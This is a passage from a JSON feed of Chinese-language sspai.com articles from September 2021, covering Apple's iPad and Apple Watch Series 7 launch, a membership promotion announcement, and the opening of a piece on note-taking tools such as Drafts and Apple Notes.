image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c50g70db34tdhn8pbnug.gif\"><figcaption>人物居中</figcaption></figure><p>新款 iPad mini 后置摄像依然为单摄，但从 800 万像素升级到了 1200 万像素，和 iPad Air 4 的摄像头一致，但利用 A15 仿生芯片可以实现智能 HDR 功能，提升画面阴影和高光的细节并提高画面质量。</p>\n<p>配件方面，新款 iPad mini 支持第二代 Apple Pencil 和一款智能双面夹保护壳，支持开盖唤醒和合盖休眠的功能，智能双面夹保护壳将提供黑色、白色、绛樱桃色、英伦薰衣草色和亮光橙色 5 款颜色。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c50g715b34tdhopdm710.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>智能双面夹</figcaption></figure><p>新款 iPad mini 有 64GB 和 256GB 两个版本可选，将于 9 月 16 日上午 9 点开始预购、9 月 24 日正式发售，售价分别为：</p>\n<ul>\n<li>64GB (Wi-Fi 版)：¥3,799</li>\n<li>256GB (Wi-Fi 版)：¥4,999</li>\n<li>64GB (蜂窝数据版)：¥4,999</li>\n<li>256GB (蜂窝数据版)：¥6,199</li>\n</ul>\n<h2>iPad：常规升级，加量不加价</h2>\n<p>除了 iPad mini，Apple 也例行更新了平价款的 10.2 英寸第九代 iPad。配置方面从去年搭载的 A12 处理器升级为了 A13 处理器，比第八代 iPad 性能提升达 20%，屏幕也首次支持原彩显示，前置摄像头则升级为了 1200 万超广角摄像头。</p>\n<p>本次更新中最引人注目的是新款 iPad 同样支持和 iPad Pro 一样的人像居中功能，这项功能可以自动调整摄像头跟随用户移动，使用户始终处于画面中央，当有新用户加入时则会逐渐放大画面使得所有人都出现在画面中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g71db34tdhj3i1e7g.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>iPad</figcaption></figure><p>此外，新款 iPad 基础价格保持不变，售价 2,499 元起，但是存储容量翻倍变为 64GB 起；将于 9 月 16 日上午 9 点开始预购、9 月 24 日正式发售，具体型号价格为：</p>\n<ul>\n<li>64GB (Wi-Fi 版)：¥2,499</li>\n<li>256GB (Wi-Fi 版)：¥3,699</li>\n<li>64GB (蜂窝数据版)：¥3,499</li>\n<li>256GB (蜂窝数据版)：¥4,699</li>\n</ul>\n<h2>Apple Watch Series 7：整体设计不变，屏幕尺寸更大</h2>\n<p>作为秋季发布会中的固定环节，Apple 更新了 Apple Watch 产品线，推出了拥有更优秀的显示屏、更多配色和更多健身功能的 Apple Watch Series 7。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c50g71lb34tdhj3i1e80.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>Apple Watch Series 7</figcaption></figure><p>Apple Watch Series 7 最容易被人发现的改变，来自它的显示屏。相比前代，Series 7 的屏幕尺寸增加了 20%，同时边框收窄至 1.7 mm，屏幕亮度在室内条件下有 70% 的提升，这些改变使得视觉效果得到提升。在此基础上，Apple Watch Series 7 也优化了表盘设计，让显示屏空间可以得到充分利用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g725b34tdhn8pbnv0.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>外观和显示效果对比</figcaption></figure><p>Series 7 的显示屏不仅变大了，也变得更加坚硬。Apple 这次重新设计了 Apple Watch Series 7 的显示屏，表镜增加 50% 的厚度，采用底面平坦的新设计，使得设备可以做到 IP6X 级别的防尘性能和 50 米防水。这些升级，无疑会让 Apple Watch 更适合户外活动。</p>\n<p>另一处明显的外观改变来自配色。Apple Watch Series 7 提供钛金属、不锈钢和铝金属三种机身选择。对于铝金属机身，将有绿色、蓝色、红色、星光色和午夜色五种新配色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g72db34tdhopdm71g.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>配色</figcaption></figure><p>相比外观的变化， Apple Watch Series 7 在硬件上升级并不大。主要提升了充电性能，搭配 USB-C 快速充电线，把电量从零充到 80% 仅需约 45 分钟。无论是习惯晚上戴着手表睡觉的用户，还是晚上忘了给手表充上电但又急着出门的人，这项提升都有一定实用性。其他方面，Apple Watch Series 7 将采用和前代相同的处理器，续航时间也保持在 18 小时。</p>\n<p>除了硬件上的升级，Apple 在继续深挖 Apple Watch 应用在健身领域的潜力。Apple Watch 现在可以自动检测蹬车的动作，提醒开启体能训练。在运动时，会把速度、骑行距离等数据通过语音进行反馈。当然，Apple 自己的健身服务 Fitness+，也更新了更多的教程和运动类型。不过，虽然今年 Fitness+ 将在 15 个国家和地区提供，但国内用户依然体验不到。</p>\n<p>输入方面，Apple Watch Series 7 加入了全键盘输入功能，还支持了滑动输入，多个 App 的按键布局也得到了重新设计，变得更加易用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/15/177173003fb7ce195871e462d71c3bc2.png\"></figure><p>Apple Watch Series 7 将在秋末发售，目前国行版本售价尚未公布。作为参考，Apple Watch Series 7 美版价格为 $399 起。</p>\n<h2>其它</h2>\n<p>根据 Apple 官网信息显示，iOS 15、iPadOS 15、watchOS 8 将于 9 月 21 日正式推出，macOS Monterey 仍然没有确认正式发布时间，将于秋季推出。</p>\n<p>值得注意的是，「年年焕新」计划也在今年开始支持在线换购，不过，根据官网信息显示：</p>\n<blockquote><p>于 Apple Store 在线商店加入本计划的顾客（包括在线订购并自行到店取货的顾客）仅可通过 Apple Store 在线商店升级换购；于 Apple Store 零售店加入本计划的顾客仅可前往 Apple Store 零售店升级换购。</p></blockquote>\n<p>因此，如果你此前加入了「年年焕新」计划，想要继续参加，只能继续通过线下 Apple Store 零售店进行换购。习惯通过线上购买 iPhone 的用户，则可以从今年开始加入「年年焕新」计划。</p>\n<h2>Apple 没准备的「One more thing」，少数派给你备上了</h2>\n<p>尽管 iOS 一直有着「易于上手」的口碑，Apple 官网也提供了 iOS 系统的说明文档，但仍有不少用户会遇到：</p>\n<ul>\n<li>用了很久的 iOS，有些功能和特性从来没用过，也不知道怎么用；</li>\n<li>遇到系统相关的软件问题没处问，去查官文文档又太费时间；</li>\n<li>系统不断更新，网上的经验贴容易过时。</li>\n</ul>\n<p>因此，少数派为你准备了《少数派系统指南 · iOS 15》。</p>\n<p>《少数派系统指南 · iOS 15》是一份面向所有 iOS 用户的指南，能够让你更全面、深入了解 iOS 的各项功能，解决你日常使用时会遇到的烦恼，发挥 iPhone 的所有价值。</p>\n<p>目前《少数派系统指南 · iOS 15》正在上架预购<strong>六折</strong>优惠中，更多介绍请前往 <a href=\"https://sspai.com/series/228\" target=\"_blank\">栏目页面</a> 查看。</p>\n<span class=\"ss-paidSection\" product-id=\"228\" type=\"paidSection\"> </span><p>少数派接下来会持续报道新 iPhone 的更多细节和体验，欢迎你通过 <a href=\"https://sspai.com/page/client\">少数派客户端</a>、<a href=\"https://weibo.com/sspaime\">官方微博</a>和微信公众号（sspaime）关注我们，获取最新内容。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68811"},{"title":"少数派会员迎来大更新，福利促销正式开启","date":"2021-09-14 10:01:42","description":"\n<p>各位少数派的读者们好。自 2021 年 6 月 1 日少数派会员（π+Prime）正式上线以来，我们已经持续运营了整整三个月的时间。在过去的三个月中，会员通讯《少数派报告》以平均每期超过五万字的容量更新了七期图文内容、两期会员播客（Precog Channel）以及六期会员音乐播客，也收获了许多会员朋友们的支持和喜爱。</p>\n<p>不过，我们对少数派会员的期待和要求不止于此。在过去的三个月中，我们也聆听了许多来自会员作者们和读者们的声音，并一直在策划新的内容和玩法，让会员服务更加丰富、更有趣味。因此，在完成了一个季度的运营之后，我们将为少数派会员服务带来诸多更新和升级，加量不加价。</p>\n<h2>🎈 太长不看——少数派会员是什么？怎么加入？</h2>\n<p>少数派会员是我们为所有少数派读者们提供的增值服务，包含一份实体周边、电子杂志《少数派报告》《科技漫游》、会员播客、会员直播及其它福利权益。少数派会员定价 365 元，将提供一年的内容更新。</p>\n<p>其中，实体周边包含会员定制徽章、会员定制贴纸、会员定制帆布袋等，每位会员均可获赠。</p>\n<p>电子杂志《少数派报告》和《科技漫游》则是每月持续更新的深度内容，《少数派报告》偏向数字生活指南，探讨潜藏在不同工作、生活场景里的知识和技巧；《科技漫游》则是即将推出的增刊，重点探讨当下热门科技资讯、效率工具玩法等。两份杂志均为半月刊，换言之，少数派会员每月可以读到四份包含深度内容的电子读物。</p>\n<p>随着《科技漫游》等版块的加入，我们也为尚未加入会员的朋友们提供了限定优惠，<strong>9 月 30 日前加入少数派会员，可以额外获赠我派新款周边礼品</strong>，详情会在下文说明。</p>\n<ul><li>🎁 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=641648482116\" target=\"_blank\">点击这里，加入少数派会员</a>（促销活动于 9 月 14 日 20:00 正式开始）</li></ul>\n<p>⚠️ <strong>注：以上为本次活动专属链接，只有通过该链接购买会员的用户才能获得赠品。</strong></p>\n<h2>🎁 福利：现在加入少数派会员，可获赠我派全新周边</h2>\n<p>在会员服务大幅升级的同时，我们也为还未加入会员的朋友们奉上了限定福利：从 9 月 14 日 20 点至 9 月 30 日 24 点，所有加入少数派会员读者均有机会获赠我派新款周边或正版软件。</p>\n<p>具体福利为：</p>\n<ul>\n<li>前 10 名下单用户：价值 148 元的水獭公仔、一派胡言鼠标垫（彩色款）各一套</li>\n<li>第 11 名至 30 名：价值 79 元的一派胡言鼠标垫（彩色款）一个</li>\n<li>第 31 名至 50 名：价值 69 元的水獭公仔一个</li>\n<li>第 51 名及以后：价值 40 元的《白描》黄金版终生会员一份</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/c22e27de98bcb225598163cc1804af03.JPG\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/570993e25686c0c9208b31b4d312a264.JPG\"></figure><h3>购买方式说明</h3>\n<p>点击 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=641648482116\" target=\"_blank\">活动链接</a> 后进入淘宝购物介面，选择包含相应赠品的套餐即可。不同套餐根据活动规则已经提前设定好了库存，如果活动开始后对应套餐无法购买，说明库存已经卖完，可以选择其它套餐。</p>\n<p>拍下并付款后系统会自动派发会员兑换码，如果选择了白描套餐，则会同时派发白描兑换码。</p>\n<ul><li>兑换会员请 <a href=\"https://sspai.com/prime/redeem\" target=\"_blank\">点击这里</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/93998e5bbecfb2a81b85c8c8ac20dbf5.png\"></figure><ul><li>👉 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=641648482116\" target=\"_blank\">点击这里，成为少数派会员</a>\n</li></ul>\n<p><strong>⚠️ 注：请通过上文链接或前往少数派软件淘宝店下单购买会员方可获赠礼品</strong></p>\n<p>此外，如果你在 9 月 14 日至 30 日的活动期间选择在 <a href=\"https://sspai.com/prime\" target=\"_blank\">少数派站内购买会员</a>，我们会赠送价值 49 元的新款付费教程《Microsoft 365 定制教程》一份，该教程目前还未正式上架，阅读权益将于首期《科技漫游》上线后解锁。</p>\n<p><strong>所有 9 月 14 日之前购买的非预购会员朋友们也将获赠该教程。</strong>小小心意，希望你喜欢。</p>\n<h2>🎉 π+Prime 大更新：《科技漫游》增刊、会员知识库、会员话题群等</h2>\n<p>本次少数派会员的更新内容很多，主要包括：</p>\n<ul>\n<li>新增《科技漫游》增刊，内容主要包含科技资讯讨论、效率工具玩法分享、为你的「稍后读」加点料等</li>\n<li>《少数派报告》定位及结构调整，强化主刊和每期讨论的主题，副刊则主要收录固定栏目</li>\n<li>新增少数派会员知识库，持续收录有价值的外部新闻、工具、文章、影片等资讯</li>\n<li>新增会员话题群，会员朋友们终于有自己的根据地啦</li>\n<li>新增会员直播活动，每月一次，在线探讨近期热门话题，并解答来自读者的问题</li>\n</ul>\n<p><strong>⏰ 所有会员权益调整都将于 9 月 22 日跟随《科技漫游》同步上线，详细更新的内容见下文。</strong></p>\n<h3>新增《科技漫游》</h3>\n<p>终始惟一，时乃日新。《科技漫游》是少数派立足传统优势领域、吸取过往出品经验、充分动员内外写作力量，为会员献上的科技内容增刊。</p>\n<video class=\"ss-videoSource video-js\" controls=\"\" poster=\"https://cdn.sspai.com/2021/09/14/9f39c56bf6e39d0fbb0e97ddd3187122.png\" title=\"\" type=\"video/mp4\" preload=\"none\"><source src=\"https://cdn.sspai.com/video/tech-odyssey.mp4\" type=\"video/mp4\"></source></video><p>注：影片配乐来自 <a href=\"https://y.music.163.com/m/song?app_version=8.5.10&amp;id=1490152253&amp;userid=130549283&amp;sc=wm\" target=\"_blank\">这里</a>，基于 CC 4.0 共享。</p>\n<p>内容编排上，每期《科技漫游》将由一篇<strong>主题文章</strong>和若干<strong>栏目文章</strong>构成。</p>\n<p>其中，主题文章为当期主打内容，除以「深度」为导向外，选题和体裁不设限制。你可能看到对科技相关设计、现象、问题的探讨，也可能看到工作流程、方法论介绍，或是数字生活的探索历程等。</p>\n<p>主题文章是「任性」的，我们可以抛开传播度、受众面的桎梏，钻研我们认为最酷、最「少数派」的问题；但更是「认真」的，我们将会更躬身参与到创作的全过程，务求让文章从外观到内在的质量都经得起推敲。</p>\n<p>另一方面，栏目文章则具有特定格式或关注对象，每期轮换组合，是读者拓宽视野、调剂口味的拼盘。我们初步规划的栏目包括：</p>\n<ul>\n<li>\n<strong>网事深读：</strong>「科技新闻」似乎已成了一个矛盾体——互联网号称有永恒的记忆，却能转身间将轰动一时的讨论冲刷殆尽；看似无限包容，却往往只给最偏颇的声音递上传声筒。在「网事深读」中，我们不求多、求快，而是会从一个热点出发，梳理前因后果、汇总中外网络上的正反观点，以期让读者对事件形成全面客观、触类旁通的认识。</li>\n<li>\n<strong>极客手册：</strong>「教程」类内容的门槛可以很低，罗列选项、复述步骤也可算作一种教程；但我们的自我要求不止于此。「极客手册」希望成为一张兼具理论和实践价值的参考卡片，以解决实际需求为导向、以使用步骤为纲，同时嵌入关于方法和原理的讨论，启发读者在学中用、用中学。</li>\n<li>\n<strong>少数派幕后：</strong>作为忠实读者，你是否好奇于一则选题如何从头脑中的火花演化为网站上齐整码放的文字？是否想知道编辑们的协作方式、工作流程和心得感悟？那么，「少数派幕后」将带你走进编辑部的「后厨」，一同见证内容是怎样炼成的。</li>\n<li>\n<strong>曲径通幽：</strong>围绕《捷径》（Shortcuts）应用的探索可谓少数派的「传统艺能」。我们在中文互联网上率先报道了《捷径》的一路发展，编写了系统的 <a href=\"https://sspai.com/series/68\">捷径教程</a>，并维护了备受好评的 <a href=\"https://shortcuts.sspai.com/\">中文捷径库</a>。「曲径通幽」将沿着我们之前的足迹继续修葺，不仅会持续提供、更新最实用的成品配方，更会着重介绍编制捷径的思路方法，让你用好这个 Apple 系统生态中的自动化利器。</li>\n</ul>\n<p>我们将会持续思考，采纳读者反馈，调整和新增栏目类型。此外，《科技漫游》一如既往地欢迎读者投稿，并提供高标准的稿酬。如有感兴趣的选题方向，欢迎与 @PlatyHsu 或 @sainho 联系。</p>\n<p>⏰《科技漫游》每月两期，将于每期《少数派报告》发布一周后上线，首期《科技漫游》定于 9 月 22 日正式上线。</p>\n<h3>《少数派报告》的主刊定位强化</h3>\n<p>在会员通讯《少数派报告》的策划阶段，我们就将其定位为「数字生活指南」，希望面向更广的领域吸纳选题，帮助读者们拓展视野、发展兴趣。因此，我们将《少数派报告》分成了 Pre 和 Cog 两部分，Pre 为主刊，聚焦当期话题；Cog 为副刊，收录和当期主题没有强关联的文章以及常规栏目。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/efbae6af15775f53672ad1e7d077919c.png\"><figcaption>未来的《少数派报告》会着重在主刊里探讨当期主题</figcaption></figure><p>就目前来看，《少数派报告》主副刊之间的区隔还不够明确。因此，在接下来的选题策划中，我们将强化每期选题以及主刊的比重，副刊则主要更新烹饪、读书、PPT 技巧等常规栏目，让《少数派报告》的杂志感更强，对于每期选题的讨论也更加深入。</p>\n<p>⏰《少数派报告》的更新时间及频率不变，仍为每月 1 日及 15 日上线，如遇法定节假日可能会提前或推迟。</p>\n<h3>属于会员们的共享知识库</h3>\n<p>《少数派报告》和《科技漫游》是少数派会员内容盛宴上的两道主菜，但只有主菜的一餐，可算不上丰富。因此，我们特地策划了「会员知识库」，来作为深度内容的补充，丰富各位会员的阅读选择。</p>\n<p>会员知识库目前分为两个板块：「采菱」和「游迹」。</p>\n<p>在「采菱」中，我们搜罗了一些小而美的实用工具，例如一些网页应用或命令行功能。这些工具因为通常因为上手门槛相对较高，或是应用场景比较特殊而不为人知，但我们相信作为「少数派」的你，肯定会乐于尝试这些新鲜有趣的事物。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/4bd74415c52dfa900e4686d42a3f7f87.png\"><figcaption>「采菱」截图</figcaption></figure><p>而「游迹」则记录了少数派会员主创们在平时搜集素材或是日常阅读中，发现的优质内容。这些内容不仅局限于《少数派报告》和《科技漫游》所涉及的主题，而是只要是我们觉得值得一读，都会在这里分享给你。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/923cefd4ec6b464e395895ec803f58ba.png\"><figcaption>「游迹」截图</figcaption></figure><p>不仅如此，这份知识库的知识来源不仅限于少数派编辑们，我们期待和会员朋友们共建会员知识库。无论是好工具还是好文章，你都可以在知识库通过表单提交，并分享给其他读者们。我们共享知识，也共享分享的快乐。</p>\n<p>⏰ 会员知识库将于 9 月 22 日跟随首期《科技漫游》一同开放，刊内会公布知识库的访问方法。</p>\n<h3>会员话题群终于来了</h3>\n<p>许多会员朋友一直希望能有一个属于会员们的交流群，但鉴于现在各平台的主题群越来越多，我们一直担心群聊无法给大家带来实际的意义和价值，所以此前并未建群。但在了解了飞书话题群的相关功能后，我们认为这种产品形态更适合少数派会员们的交流与分享，因此，少数派会员话题群正式建立。</p>\n<p>所有加入该群的会员均可自由创建话题，其他会员朋友也能在该话题下发起讨论。相比你一言我一语的群聊，话题群能让讨论更加集中，聊天过程中的精彩发言也能持久沉淀。</p>\n<p>我们希望全新的话题群不是你的另一个「闲聊集散地」，而能成为认识新朋友、了解新鲜事的新去处。关于会员权益的相关动态也会在群内优先更新，便于大家知悉或参与。</p>\n<p>⏰ 会员话题群将于 9 月 22 日跟随首期《科技漫游》一同开放，刊内会公布会员群的加入方式。</p>\n<h3>会员直播 Precog Live</h3>\n<p>我派此前就尝试过 Power+ Live 及其它直播形式，得到了许多朋友的喜爱。在少数派会员中，我们决定沿用「在线声音直播」的形式，上线全新的直播栏目 Precog Live。Precog Live 将结合当月的会员通讯及科技热点事件来制定话题并展开讨论，还会在直播中邀请读者们上麦互动，解答大家的疑问。</p>\n<p>直播结束后，每期 Precog Live 还将制作为播客，供没有参与直播的朋友收听。</p>\n<p>⏰ Precog Live 每月一期，每月的最后一周举行。首期 Precog Live 的主题暂定为「借 MacStories 的服务升级，谈谈如何制作一档付费内容」，我们会在直播中聊聊筹备少数派各项付费内容服务的经验和实践，并探讨内容创作的深度与广度。直播时间暂定为 9 月 29 日，具体时间安排将在会员话题群内公布，欢迎会员朋友们关注和参与。</p>\n<h3>📦 周边发货：已经全部发完，再次感谢等待</h3>\n<p>经过漫长的等待，会员周边礼盒终于发货了。如此前我派多次介绍，我们为了给预购会员们更多惊喜，在上线前临时决定加赠一本我派新书《数字时代效率手册》，没想到各种版号、物流等层层受阻，直到 9 月份才正式拿到成品，可谓好事多磨。</p>\n<p>本周起，所有会员周边已经分批发出。由于上千份周边是陆续寄出的，所以不同地区会员们收到货的时间会有所不同。再次感谢大家的耐心等待，如果一周后还有哪位朋友未收到礼品，可以及时跟我们联络反馈。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/14/173ce09020c6e80cf32598a347c86512.jpg\"><figcaption>仓库发货盛况</figcaption></figure><p>此外，由于预购会员的编号、徽章及包装盒需要一一对应，我们全部采用人工排查，难免产生疏漏。如果遇到相关问题也可以及时反馈，我们会调换或补发等。</p>\n<p>目前在社交媒体上已经有不少收到周边礼盒的朋友开始晒单了，也欢迎大家收到后来评论区或者到微博上晒一晒，分享你的喜悦。</p>\n<h2>结语</h2>\n<p>虽然会员上线只有短短的三个月，但对参与这个项目的少数派同事们来说，这三个月却显得无比漫长。在三个月的过程中，我们遇到了不少挑战和挫折。尤其在「不想重复过去的自己」的思路和标准之下，从选题策划到内容制作，再到品牌和用户运营，每一步都是少数派此前很少尝试的新领域。</p>\n<p>再次感谢支持我们的老会员和新会员们。在完成本次大更新之后，我们内部也明确了少数派会员的迭代和改进方向，这项服务会是一个不断升级、不断加入新玩法和新内容的产品，希望可以不辜负大家对少数派的期待和喜爱。</p>\n<p>继续向我们心中的星辰大海进发吧！</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68762"},{"title":"从手写到 Roam Research，他们在用这些别致的笔记方法论","date":"2021-09-14 09:23:13","description":"\n<p>「如何做笔记」一直是少数派内容的「流量密码」，首先从学生时代老师常念叨的「好记性不如烂笔头」开始，做笔记就一直伴随着我们对待任何信息输入输出；其次没有绝对普适正确的笔记方法，不同行业、身份乃至场景都有着无数种「恰到好处」的笔记方法，而这通常因人而异，所以大家都喜欢看笔记相关的不同分享，试图从中获得启发。</p>\n<p>所以在这篇文章里，我找了几个少数派的老作者向大家分享自己的笔记方法，他们有的是老师，有的是在读学生，有的正在埋头苦研自己的数篇博士论文。他们给出的不一定是标准答案，但他们的确凭靠着这些方式让自己的工作和学习更加高效，我们一起来看看他们怎么说。</p>\n<h2>\n<a class=\"ss-atUser\" data-mention=\"@玉树芝兰\" user-id=\"bs2p3htb34tch279q3pg\" href=\"https://sspai.com/u/a5xddvxl\">@玉树芝兰</a> 好的笔记工具不止一个，便也不执着于「就一个」</h2>\n<p>常有人问我：</p>\n<blockquote><p>王老师，你平时用哪款笔记工具啊？</p></blockquote>\n<p>这句话的潜台词，<strong>是我只用一款笔记工具。</strong></p>\n<p>确实，我也曾经试图找到某个「十项全能」的笔记工具，提供一站式功能解决。但是那是一条折腾的不归路。从 Word 到 Vim ，从 Emacs orgmode 到印象笔记，从 Bear 到 Devonthink，从 Drafts 到 Ulysses，从 Milanote 到 Notion，从 Scrivener 到 Roam Research 。这其中还有 Apple Notes, Flomo 和 Craft ……</p>\n<p>后来，我发现自己的前提假设就错了——谁给我规定，只能用一款笔记工具了？此时刚好看了张玉新老师（善用佳软）的一场直播，听他说了一个词儿，叫「<a href=\"https://t.zsxq.com/aIiI6UZ\" target=\"_blank\">重器轻用</a>」。于是我恍然大悟，跳出了这个怪圈儿。张老师对于各种笔记工具的态度是：</p>\n<blockquote><p>不关注某个笔记工具哪方面不足，而是只关注吸引他的那一面，只用那一点。</p></blockquote>\n<p>这样一来，每一个他所用的工具，看到的就都是长处，使用起来就颇为愉快。而某款工具其他的功能，可以有很多，他全都忽略，这就是所谓的「重器轻用」。有人会啧啧叹息：唉，那你岂不是花了全价，才买来了 20% 甚至更少的功能？亏了啊！可对我来说，那 20% 的功能，带来的价值，已经能覆盖、甚至是超过全价了。</p>\n<p>贪心不好。</p>\n<h3>打造属于自己的笔记系统</h3>\n<p>不过我们通过实践都知晓，仅从某款软件摘取 20% 的功能，似乎是不足以单独支撑「记笔记」这个事儿的。有的工具擅长采集，有的工具擅长标注，有的工具擅长捕捉灵感，有的工具擅长穿针引线。可是，但凡我们记笔记是认真严肃的，那这些功能都需要啊。</p>\n<p>解决之道，<strong>是把这些笔记的精华功能联系起来，组合构造一个系统。</strong>这个系统用于应对笔记的全过程，从输入到输出。</p>\n<p>说起来容易，做起来却未必如此顺利。许多笔记工具，在数据的流入流出上，都有不同的限制，很容易形成孤岛。例如许多笔记工具，都支持富文本（Rich Text）格式。但是 Roam Research 并不支持富文本的直接导入。因此它和这些笔记工具间，就难以形成有效的协同。</p>\n<p>对于某些笔记工具来说，孤岛是个理想状态，这样可以把用户「圈禁」在自己的掌控中，不至于见异思迁。但是对于我们笔记用户来讲，这种情况就很糟糕。所以，我们需要找到一些工具，帮助我们充当「桥梁」。</p>\n<p>《卡片笔记写作法》一书将笔记划分成了 3 种类型，分别为：</p>\n<ul>\n<li>临时笔记（fleeting notes）</li>\n<li>文献笔记（literature notes）</li>\n<li>永久笔记（permanent notes）</li>\n</ul>\n<p>其中，永久笔记，我已经 <a href=\"https://sspai.com/post/60787\" target=\"_blank\">确定了在 Roam Research 中完成整理</a>。而 <a href=\"https://sspai.com/post/60707\" target=\"_blank\">文献笔记</a>，并不是每一个笔记工具的使用者都会用到。本文咱们就专注来谈谈，如何记录临时笔记，并且把它<strong>融入我们的笔记系统和工作流程</strong>。</p>\n<h2>笔记最初的形态要最快</h2>\n<p>临时笔记（Fleeting Notes）是笔记的最初形态。记录它的要求，就是一个字——快。</p>\n<p>唯有足够快，才能抓住我们突然迸发却又转瞬即逝的灵感。那种感觉，就如同在烟花划过夜空的一刹那完成拍摄。</p>\n<p>在手机成为我们的「外挂身体器官」之前，记录临时笔记的介质，一直是纸和笔。但是你知道的，纸片往往会被丢弃，笔记本总会被搁在角落吃灰。所以临时笔记经常不知不觉，就变成了永远不见的记录。</p>\n<p>使用软件工具来记录临时笔记，有 2 个好处。首先是保证笔记存了起来，不会被乱丢；其次因为已经是数字化的内容，整理成本相对较低。我记录临时笔记，目前主要采用两款工具。分别是 Drafts 和苹果系统自带的「备忘录」。</p>\n<p>先说说 Drafts 的使用。Drafts 最大的特点，是打开速度非常快。在电脑、手机、iPad，甚至是手表上，都能快速呼叫出来，开启一张全新的「卡片」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s6db34tcuopj7s1g.jpeg\"></figure><p>Drafts 在多个终端设备之间，都能方便同步。且因为记录的内容是纯文本，所以设备间同步速度飞快。相较而言，如果你采用的工具里面有太多图片需要同步传输，就往往会拖慢了开启与同步完成速度，影响你记录的心情，甚至让你灵感和记录冲动都被消磨掉。</p>\n<p>我比较喜欢在 Drafts 里面使用语音输入，尤其是手机上。有时候我一边散步，一边听课程。偶有灵感，立即拿出手机开启 Drafts ，然后靠着讯飞语音输入法，把内容先灌进去再说。之后，继续走路和听课。</p>\n<p>目前的语音输入工具，准确率已经很高了，但是毕竟达不到 100%。如果输入内容很多，后期需要在里面修改的压力会相对较大，导致你干脆视而不见，记录下来的内容会「沉睡」。但是如果每张卡片输入内容简短，则错误相对少，找寻修改也更加容易。这样一来，你记录之后，也会有足够的干劲儿进行整理和修改。而在一则笔记中，内容更加聚焦、凝练，也符合 <a href=\"https://sspai.com/post/59109\" target=\"_blank\">卢曼对于单则卡片笔记的要求</a>。</p>\n<p>Drafts 的缺点，是不支持本地拖拽插图。这着实让我纠结了一阵子。毕竟，很多图片，尤其是截图，如果生成时没有能够快速纳入到笔记中，和对应的文字融为一体，将来再想找寻，可就费劲了。我平时写的文章里，很多是介绍工作流程的。一幅图胜过千言万语，插图是高频刚需。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s6lb34tcvt9nu6q0.jpeg\"></figure><p>好在，有了 <a href=\"https://sspai.com/post/68344\" target=\"_blank\">操作系统级双向链接工具 Hook 的加持</a>，这个事儿就变得简单多了。我只需要呼叫 Hook，把图片变成一个 Markdown 链接，往 Drafts 里面一扔就好了。正如 「Hook」的名称本意，我们把这张图片，钩在了这段文字上面，不怕它跑掉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s6tb34tcvt9nu6qg.jpeg\"></figure><p>但是有的时候，我们的临时笔记形态，并不是文本，而是图画，甚至是涂鸦。例如下图，是我在看雪小豹（李娟）直播的时候，随手在 iPad 上面截图，然后用红笔进行了标记。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s75b34tcuopj7s20.jpeg\"></figure><p>另外，有的时候思路来了，却不足以形成文本输出的形态，而是一些结构草图。这时候，如何快速记录呢？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s7db34tcvciqaaeg.jpeg\"></figure><p>幸好，在苹果的生态里，有个「备忘录」可用。它同样跨越电脑、平板和手机多端。备忘录里面，你可以放上各种图。截屏可以，手绘也没问题。</p>\n<p>在 iPadOS 15 （目前是测试版）里面，备忘录变得尤其强大。因为，你可以从屏幕右下角往左上方滑动（用 Apple Pencil 或者手指均可），随时把它拖拽出来。对于部分应用，它甚至可以直接显示当前应用文档的链接，你轻轻一点，就可以将链接加入到笔记中。这样一来，你笔记的上下文都一应俱全。</p>\n<figure class=\"image ss-img-wrapper\"><img 